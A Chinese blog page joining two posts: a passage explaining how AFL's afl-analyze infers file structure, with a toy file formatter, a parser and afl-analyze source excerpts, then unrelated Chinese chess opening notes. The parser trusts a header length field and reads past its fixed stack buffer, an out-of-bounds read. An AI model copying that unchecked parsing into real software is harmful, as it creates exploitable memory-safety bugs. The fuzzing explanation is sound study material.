<span class="string">&quot;format_dstb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//formatter input output</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> *input = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">char</span> *output = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    FILE * fp = fopen(input, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="type">int</span> file_size = ftell(fp);</span><br><span class="line">    <span class="type">int</span> data_size = (file_size + <span class="number">3</span>) &amp; ~<span class="number">3</span>; <span class="comment">//round up to nearest 4 bytes</span></span><br><span class="line">    <span class="type">char</span> *data = <span class="built_in">malloc</span>(data_size);</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, data_size);</span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    fread(data, <span class="number">1</span>, file_size, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    DSTB_Header header = &#123;</span><br><span class="line">        .magic = DSTB_HEADER_MAGIC,</span><br><span class="line">        .data_size = data_size</span><br><span class="line">    &#125;;</span><br><span class="line">    DSTB_Footer ender = &#123;</span><br><span class="line">        .magic = DSTB_FOOTER_MAGIC,</span><br><span class="line">        .check_sum = <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> check_sum = <span class="number">0</span>;</span><br><span class="line">    check_sum = header.magic ^ header.data_size;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; data_size; i++)&#123;</span><br><span class="line">        check_sum ^= data[i];</span><br><span class="line">    &#125;</span><br><span class="line">    check_sum ^= ender.magic;</span><br><span class="line">    ender.check_sum = check_sum;</span><br><span class="line"></span><br><span class="line">    FILE * out = fopen(output, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(&amp;header, <span class="keyword">sizeof</span>(DSTB_Header), <span class="number">1</span>, out);</span><br><span class="line">    fwrite(data, <span class="number">1</span>, data_size, out);</span><br><span class="line">    fwrite(&amp;ender, <span class="keyword">sizeof</span>(DSTB_Footer), <span class="number">1</span>, out);</span><br><span class="line">    fclose(out);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>为其编写parser</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;format_dstb.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">300</span>];</span><br><span class="line">    <span class="type">int</span> file_len = read(<span class="number">0</span>,input,<span class="number">300</span>);   <span class="comment">//从标准输入获取</span></span><br><span class="line">    DSTB_Header *header = (DSTB_Header*)input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(header-&gt;magic!= DSTB_HEADER_MAGIC)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid header magic\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> data_size = header-&gt;data_size;</span><br><span class="line">    <span class="type">char</span> *data = input + <span class="keyword">sizeof</span>(DSTB_Header);</span><br><span class="line">    <span class="type">char</span> *footer = data + data_size; </span><br><span class="line">    DSTB_Footer *f = (DSTB_Footer*)footer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(f-&gt;magic!= DSTB_FOOTER_MAGIC)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid footer magic\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> check_sum = <span class="number">0</span>;</span><br><span class="line">    check_sum = header-&gt;magic ^ header-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;data_size;i++)&#123;</span><br><span class="line">        check_sum ^= data[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check_sum ^= f-&gt;magic;</span><br><span class="line">    check_sum ^= f-&gt;check_sum;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data size: %d\n&quot;</span>,data_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Check sum: %d\n&quot;</span>,check_sum);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(check_sum != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid check sum\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;accepted&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>接下来用<code>afl-analyze</code>分析文件结构</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250301150622626.png" alt="image-20250301150622626"></p>
<p>afl发现了两个魔数、数据块</p>
<p>虽然没有发现校验和, 但是能发现这已经很神奇了</p>
<p>并且这界面花花绿绿的, 着实豪堪</p>
<h2 id="🧄法原理"><a href="#🧄法原理" class="headerlink" title="🧄法原理"></a>🧄法原理</h2><p>首先保持输入不变, dry_run一次 ,记录执行路径共享内存校验和为orig_cksum</p>
<p>然后遍历输入, 对于每个字节, 分别进行如下四个变异操作:</p>
<p>1.整体取反, 执行 , 记录执行后的共享内存校验和xor_ff</p>
<p>2.末位取反, 执行 , 记录校验和xor_01</p>
<p>3.减去0x10, 执行 , 记录校验和sub_10</p>
<p>4.加上0x10, 执行 , 记录校验和add_10</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">in_data[i] ^= <span class="number">0xff</span>;</span><br><span class="line">xor_ff = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">in_data[i] ^= <span class="number">0xfe</span>;</span><br><span class="line">xor_01 = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">in_data[i] = (in_data[i] ^ <span class="number">0x01</span>) - <span class="number">0x10</span>;</span><br><span class="line">sub_10 = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">in_data[i] += <span class="number">0x20</span>;</span><br><span class="line">add_10 = run_target(argv, in_data, in_len, <span class="number">0</span>);</span><br><span class="line">in_data[i] -= <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这四个变异操作是单独执行的, 互相不影响, 每次操作之后都会当前字节还原</p>
</blockquote>
<p>这样四个结果会有16种情况,afl-analyze只关心其中几种情况</p>
<p>1.四个检校和均和orig_cksum一致, 意味着对该字节任何变动不会影响执行路径 ,字微节轻</p>
<p>2.这四个检校和中有至少一个不等于orig_cksum, 认为该字节可以变异, 但是也就那样吧, 不太重要</p>
<p>3.四次变异后的检校和相同, 但是不等于orig_cksum, 则认为这个地方不能改, 比如文件魔数,检校和等等, 这里如果不对了则parser直接丢弃文件</p>
<p>4.四次变异之后的检校和与orig_cksum均不相同, 并且这四个检校和也各不相同, 说明该位置会显著影响控制流, 可能是一个switch case位置或者一个if的条件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xff_orig = (xor_ff == orig_cksum);</span><br><span class="line">x01_orig = (xor_01 == orig_cksum);</span><br><span class="line">s10_orig = (sub_10 == orig_cksum);</span><br><span class="line">a10_orig = (add_10 == orig_cksum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xff_orig &amp;&amp; x01_orig &amp;&amp; s10_orig &amp;&amp; a10_orig) &#123;</span><br><span class="line"></span><br><span class="line">  b_data[i] = RESP_NONE;</span><br><span class="line">  boring_len++;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (xff_orig || x01_orig || s10_orig || a10_orig) &#123;</span><br><span class="line"></span><br><span class="line">  b_data[i] = RESP_MINOR;</span><br><span class="line">  boring_len++;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (xor_ff == xor_01 &amp;&amp; xor_ff == sub_10 &amp;&amp; xor_ff == add_10) &#123;</span><br><span class="line"></span><br><span class="line">  b_data[i] = RESP_FIXED;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> b_data[i] = RESP_VARIABLE;</span><br></pre></td></tr></table></figure>





<p>考虑到一个字段可能是连续的四个字节(int类型), 或者八个字节等等, afl-analyze会在给当前字节下结论之后, 再联系上一个字节看看</p>
<p>如果上一个字节和当前字节的四种检校和, 每种都各自不一样, 说明这相邻的两个字节的作用大不相同, 应该是不同的字段.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (prev_xff != xor_ff &amp;&amp; prev_x01 != xor_01 &amp;&amp;</span><br><span class="line">    prev_s10 != sub_10 &amp;&amp; prev_a10 != add_10) seq_byte ^= <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">b_data[i] |= seq_byte;</span><br><span class="line"></span><br><span class="line">prev_xff = xor_ff;</span><br><span class="line">prev_x01 = xor_01;</span><br><span class="line">prev_s10 = sub_10;</span><br><span class="line">prev_a10 = add_10;</span><br></pre></td></tr></table></figure>





<p>等所有的字节都变异一遍了, 下面要打印装👃界面了, 这里除了装👃还是有一些推理的</p>
<p>刚才已经初步给每个字节有一个判断, 并且也划分了字段, 现在利用上述信息:</p>
<p>对于字段的首字节是非常重要不能改的, 也就是上述变异结果中的第3个, “四次变异后的检校和相同, 但是不等于orig_cksum,”</p>
<p>​	如果这个字段长2字节字节 </p>
<p>​		并且字段上的值的小端序或者大端序值, 比输入数据长度小, 那么认为这个字段是一个长度值</p>
<p>​		否则如果这个字段的首字节值和次字节值相差超过32, 那么认为这个字段是一个检校和</p>
<p>​	否则如果这个字段长4字节,</p>
<p>​		并且字段上的值的小端序或者大端序值, 比输入数据长度小, 那么认为这个字段是一个长度值</p>
<p>​		否则如果该字段的首字节最高位, 不等于其他字节之一的首字节最高位, 则认为该字段是一个校验和</p>
<p>​	其他长度就不得而知了</p>
<p>此部分代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rtype == RESP_FIXED) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (rlen) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line"></span><br><span class="line">        u16 val = *(u16*)(in_data + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Small integers may be length fields. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; (val &lt;= in_len || SWAP16(val) &lt;= in_len)) &#123;</span><br><span class="line">          rtype = RESP_LEN;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Uniform integers may be checksums. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; <span class="built_in">abs</span>(in_data[i] - in_data[i + <span class="number">1</span>]) &gt; <span class="number">32</span>) &#123;</span><br><span class="line">          rtype = RESP_CKSUM;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line"></span><br><span class="line">        u32 val = *(u32*)(in_data + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Small integers may be length fields. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; (val &lt;= in_len || SWAP32(val) &lt;= in_len)) &#123;</span><br><span class="line">          rtype = RESP_LEN;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Uniform integers may be checksums. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; (in_data[i] &gt;&gt; <span class="number">7</span> != in_data[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span> ||</span><br><span class="line">            in_data[i] &gt;&gt; <span class="number">7</span> != in_data[i + <span class="number">2</span>] &gt;&gt; <span class="number">7</span> ||</span><br><span class="line">            in_data[i] &gt;&gt; <span class="number">7</span> != in_data[i + <span class="number">3</span>] &gt;&gt; <span class="number">7</span>)) &#123;</span><br><span class="line">          rtype = RESP_CKSUM;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span> ... MAX_AUTO_EXTRA - <span class="number">1</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>: rtype = RESP_SUSPECT;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/%E7%96%91%E5%BD%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%E7%96%91%E5%BD%A2/" class="post-title-link" itemprop="url">疑形与攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-04-22 13:10:00" itemprop="dateCreated datePublished" datetime="2025-04-22T13:10:00+08:00">2025-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-05-02 04:14:28" itemprop="dateModified" datetime="2025-05-02T04:14:28+08:00">2025-05-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="疑形与攻击"><a href="#疑形与攻击" class="headerlink" title="疑形与攻击"></a>疑形与攻击</h1><h2 id="顺炮"><a href="#顺炮" class="headerlink" title="顺炮"></a>顺炮</h2><h3 id="疑形"><a href="#疑形" class="headerlink" title="疑形"></a>疑形</h3><h4 id="第1局-当头棒喝-✨"><a href="#第1局-当头棒喝-✨" class="headerlink" title="第1局 当头棒喝 ✨"></a>第1局 当头棒喝 ✨</h4><p>棒槌王</p>
<p>顺炮横车对直车巡河局面下, 红左马跳正, 勾引黑车8平3杀兵压马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308180644393.png" alt="image-20250308180644393"></p>
<p>红方迎难而上挺起七兵然后左马盘河, 然后飞象驱车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308181307486.png" alt="image-20250308181307486"></p>
<p>此局面下黑车只有三个去处, 然而都不是好地方, 或者进炮塞象眼</p>
<p>如果黑进炮塞象腰则红方进车抓炮</p>
<h4 id="第2局-边马离心"><a href="#第2局-边马离心" class="headerlink" title="第2局 边马离心"></a>第2局 边马离心</h4><p>杀🐎王</p>
<p>顺炮横车对直车 局面下 黑方右马屯边，，此时红方立刻车六进六捉炮进行利用</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032248959.png" alt="image-20250322032248959"></p>
<p>进车一抓黑炮巡河，再退车一抓，黑兵1进1用马给炮生根，此时红跳正马勾引黑炮来打，实际上是勾引黑炮让开2路，红乘机进炮打马然后中炮发射，后面伺机做铁门栓</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032500109.png" alt="image-20250322032500109"></p>
<p>走到这个局面黑方基本无了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032734487.png" alt="image-20250322032734487"></p>
<p>走到这个局面已经绝杀了，这个铁门栓杀法可以记一下</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032955500.png" alt="image-20250322032955500"></p>
<h4 id="第3局-兵团大战"><a href="#第3局-兵团大战" class="headerlink" title="第3局 兵团大战"></a>第3局 兵团大战</h4><p>优势在我王</p>
<p>顺炮横车对直车局面下，黑方逆天补士，红方立刻车六进七，准备平二吃死马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322033451675.png" alt="image-20250322033451675"></p>
<p>如果黑跳正马则平车抠，小心黑巡河炮倒钩打车同时打底象抽车，冲七兵防住即可，下面3马抠爽了后面套上左炮狠狠打，伺机车七平三抠7马，上下其手</p>
<p>如果黑马屯边则红进攻矛头指向黑1路，</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322034009296.png" alt="image-20250322034009296"></p>
<p>这里空头可以给，黑方一时半会儿不能重炮，红三马还在防守</p>
<h4 id="第4局-攻城略地"><a href="#第4局-攻城略地" class="headerlink" title="第4局 攻城略地"></a>第4局 攻城略地</h4><p>攻略王</p>
<p>在当前局面下, 红方马上车杀卒压马, 黑方有两种应法, 一是飞边象出象位车看马消极防御, 二是巡河炮弹性防御</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305150405582.png" alt="image-20250305150405582"></p>
<h5 id="黑巡河炮弹性防御"><a href="#黑巡河炮弹性防御" class="headerlink" title="黑巡河炮弹性防御"></a>黑巡河炮弹性防御</h5><p>假设红车杀兵压马, 此时黑炮貌似可以平3,意图如果红车杀马, 则黑炮打马倒勾打车同时打另一匹马. 但是红可以马七退五迎刃而解, 同时黑3马还是被压, 黑需要再走一个高车保马, 此时红就可以冲兵拱炮了, 黑炮立不住</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305151119031.png" alt="平炮打马是假棋"></p>
<p>黑正确走法是高车保马, 此时红方需要挺起七兵防止黑炮2平3瞄着马和底象.</p>
<p>此时黑方有沿河十八打和退炮打车两种手段, 沿河十八打依然解决不了3马被压的问题.因此退炮反击.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305152517255.png" alt="image-20250305152517255"></p>
<p>假设红方没有杀兵压马, 而是先挺七兵, 目的是防止黑炮2平3.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305152903688.png" alt="image-20250305152903688"></p>
<p>那么此时黑方就可以有个想法: 通过兑3卒将8路车调到3路防止压马, 同时在右翼集结了兵力</p>
<p>但是直接冲3卒红方不会立刻兑兵, 而是车六平七先压马,不管这个卒</p>
<p>因此黑方需要先办些手续:</p>
<p>炮2平7, 打马</p>
<p>马七进八, 封车同时保马</p>
<p>卒3进1, 红方必须得兑兵, 否则如果还平车压马则黑继续冲卒, 抓红八路马 ,如果红车杀兵则黑马压不住了, 如果红车杀马则黑卒杀马, 黑多一个过河兵</p>
<p>兵七进一, 炮7进3 </p>
<p>炮八平三, 车8平3</p>
<p>到此黑方解决了3马被压的问题</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305153730590.png" alt="image-20250305153730590"></p>
<h5 id="黑飞边象消极防御"><a href="#黑飞边象消极防御" class="headerlink" title="黑飞边象消极防御"></a>黑飞边象消极防御</h5><p>此局面下红方很可能直接就车杀兵压马了, 毕竟难以抵挡这个诱惑</p>
<p>黑出象位车保马, 此时红抬巡河炮, 意图套在车后狠狠打马, 但是慢一步, 黑马退窝心同时以暗车兑红明车, 红方就没有攻势了并且黑方车更明, 反先</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305165104913.png" alt="image-20250305165104913"></p>
<p>红正确走法应该先抬炮, 保留压马的变化, 并且巡河炮有多个打击点位, 使得黑方顾此失彼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305165957909.png" alt="image-20250305165957909"></p>
<p>红方巡河炮对黑的最大威胁就是3马, 下一步红就要平车压马, 非常严厉, 因此黑方必须首先防备3马</p>
<p>如果黑平车到3路将会被利用:</p>
<p>炮八平二, 马7退5</p>
<p>兵七进一, 车3进1</p>
<p>马七进六 , 车给马生根后面套着炮打黑车, 红方直接就爽高潮了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305170320106.png" alt="image-20250305170320106"></p>
<p>因此只能冲3卒应对</p>
<h4 id="第5局-避实击虚"><a href="#第5局-避实击虚" class="headerlink" title="第5局 避实击虚"></a>第5局 避实击虚</h4><p>假动作王</p>
<p>在当前局面下, 黑方飞起边象, 目的是应对红方车六进五然后平三压马, 黑方可以象位车看马</p>
<p>但是象飞的太早了, 等红车六进五时再飞也不迟, 此时飞可能是为了保住三卒 ,但是也削弱了防御, 联象困难</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305144553845.png" alt="image-20250305144553845"></p>
<p>那么红方就不要再进车压马了, 黑方不管从心理上还是阵型上都已有了防备, 此后战略上红方将进攻矛头转向黑方左侧</p>
<h4 id="第6局-曲径通幽"><a href="#第6局-曲径通幽" class="headerlink" title="第6局 曲径通幽"></a>第6局 曲径通幽</h4><p>通幽王</p>
<p>在此局面下, 黑车点兵林企图杀兵压马, </p>
<p>退炮打车不成立, 红方来不及套炮打车</p>
<p>平中炮补象给马生根太憋屈了, 相当于炮二平五又炮五平四浪费了一步棋 ,黑方反先</p>
<p>上马蹬车正确, 引诱黑杀兵压马, 然后红马退窝心, 伺机从右侧跳出, 并且也不怕黑方当头炮, 红河口马可以随时马四进六兑换中炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305143238353.png" alt="image-20250305143238353"></p>
<h4 id="第7局-一箭三雕"><a href="#第7局-一箭三雕" class="headerlink" title="第7局 一箭三雕"></a>第7局 一箭三雕</h4><p>箭雕王</p>
<p>顺炮直车对横车 互进三兵 之后, 红进车骑河捉黑3卒, 在此局面下, 黑方有几种应对方法</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308172332634.png" alt="image-20250308172332634"></p>
<p>1退窝心炮, 设陷阱诱杀红车 ,红方上当黑方血赚 ,红方不上当黑方也不亏</p>
<p>2上正马, 无视红方, 此后车4进1保马然后退炮打车反击, 还是需要高车保马, 有点委屈</p>
<p>3飞边象, 死板防守 ,等着挨打就完了</p>
<p>本局就针对黑方飞边象展开打击</p>
<p>红左炮平边, 随时发射, 打车是先手, 并且再打7卒威胁打底象又是先手, </p>
<p>平边炮后红左车也可以随时开出, 压制黑方右侧马炮, </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308173125233.png" alt="image-20250308173125233"></p>
<h4 id="第8局-叶底藏花"><a href="#第8局-叶底藏花" class="headerlink" title="第8局 叶底藏花"></a>第8局 叶底藏花</h4><p>藏花王</p>
<p>在顺炮直车对横车 - 两头蛇对双横车局面下,</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308173837780.png" alt="image-20250308173837780"></p>
<p>此局面下红方左炮巡河, 其目的是掩护左马盘河, 再套炮打车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308174856559.png" alt="image-20250308174856559"></p>
<p>此时黑方的反击重点是红七路, 车1平3藏于马后, 如叶底藏花</p>
<p>此后如果红左马盘河则黑挺3卒破坏红方河口阵地, 黑方不害怕红方套后炮打车, 因为黑方也可平炮挡在车前, 并且有炮打底士同时车捉炮的手段. </p>
<p>基于这个考虑, 如果红先车九进二, 给待会儿后炮生根, 那么黑必须立刻进中兵从中路突破, 如果后面红方还要卸中炮套在马后打车, 那么红方中路将更加薄弱, 此时黑方应该继续贯彻中路突破的战略, 哪怕一车换二同时保持攻势.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308175722869.png" alt="image-20250308175722869"></p>
<p>红方左马盘河后应该立刻进3卒破坏红方河口阵地, 逼迫红方套炮或者继续进马表态</p>
<p>继续进马, 黑方只需要继续冲3卒过河,简单得很</p>
<p>套后炮则黑方直接弃车继续冲中卒</p>
<h4 id="第9局-刚柔并济"><a href="#第9局-刚柔并济" class="headerlink" title="第9局 刚柔并济"></a>第9局 刚柔并济</h4><p>双管王</p>
<p>在顺炮直车对横车 - 红两头蛇局面下 ，黑方的最佳应着是双横车， 走成顺炮直车对横车 - 红两头蛇对黑双横车 局面</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322010229764.png" alt="image-20250322010229764"></p>
